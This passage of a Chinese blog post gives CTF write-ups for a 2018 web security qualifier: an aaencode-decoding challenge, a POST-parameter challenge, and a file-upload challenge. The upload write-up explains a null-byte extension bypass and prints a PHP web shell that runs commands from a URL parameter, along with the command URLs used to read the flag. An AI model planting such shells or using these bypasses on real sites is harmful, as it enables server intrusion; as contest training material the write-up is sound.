(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure><br>好长啊<br>放到aaencode里面去<br>给出解码网站：<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a><br><img src="2018WEB安全测试秋季预选赛/9.png" alt=""><br>    Flag{660332922504a5f06dd871a7fe78ba9c}</p>
+<h3 id="6-参数提交"><a href="#6-参数提交" class="headerlink" title="6.参数提交"></a>6.参数提交</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8012/" target="_blank" rel="noopener">http://114.55.36.69:8012/</a><br>这个就没啥好说的了<br>POST提交参数就行了<br>    flag=1111111111111111<br><img src="2018WEB安全测试秋季预选赛/10.png" alt=""><br>    flag{858a14671c27804b63e6e96b0acdfdd7}</p>
+</blockquote>
+<h3 id="7-刚写了个小站"><a href="#7-刚写了个小站" class="headerlink" title="7.刚写了个小站"></a>7.刚写了个小站</h3><blockquote>
+<p>题目地址：<a href="http://114.55.36.69:8014/" target="_blank" rel="noopener">http://114.55.36.69:8014/</a><br>这个题稍微有点坑，花了点力气<br>上来先注册一个号<br>进去后是个网站，先扫描后台发现有<code>url/uploads/</code>这个目录<br>然后想到这个题有可能是文件上传，果然在网站的侧栏发现了<code>upload</code>按钮<br><img src="2018WEB安全测试秋季预选赛/11.png" alt=""><br>上传其实很简单，后缀改成<code>.php.jpg</code>(这个题只能提交jpg,不能提交png)<br>然后抓包在php后边加个空格，在十六进制里把空格的20改成00截断，这样就可以上传成功<br>上传成功后用菜刀连不上，应该是网站加了安全保护措施<br>所以只能在URL框里执行命令了<br>上传的木马里写入这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arg &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($arg) &#123;</span><br><span class="line">system(&quot;$arg&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>然后在URL里直接使用<code>http://114.55.36.69:8014/upload/8a30ec6807f71bc69d096d8e4d501ade/u.php?cmd=ls</code><br><img src="2018WEB安全测试秋季预选赛/12.png" alt=""><br>可以看到我们的命令被成功执行了<br>ok，接下来就是寻找flag的位置和查看flag了，直接给出payload<br><code>http://114.55.36.69:8014/upload/8a30ec6807f71bc69d096d8e4d501ade/u.php?cmd=cd%20..;cd%20..;cat%20flag.php</code><br>回车后页面是空的，因为php代码是不会显示出来的<br>查看页面源代码就能看到内容了<br><img src="2018WEB安全测试秋季预选赛/13.png" alt=""><br>    flag{N4me_sPac4_Is_Int3r3st1ng}</p>
+</blockquote>
+<p>由于时间有限，只写出来了7个题，剩下3个300分的还没看。2333333</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="ck4saoxdg0000vguy6m8u1syu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          PHP特性总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">海洋CMS</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS/" rel="tag">CMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%94%BB%E9%98%B2/" rel="tag">攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CMS/" style="font-size: 20px;">CMS</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 10px;">攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/11/15/PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">PHP特性总结</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/">2018WEB安全测试秋季预选赛</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/19/%E6%B5%B7%E6%B4%8BCMS/">海洋CMS</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/05/docker%E5%BF%83%E5%BE%97/">docker心得</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/21/%E5%86%8D%E8%A7%81CMS-%E9%BD%90%E5%8D%9ACMS/">再见CMS--齐博CMS</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
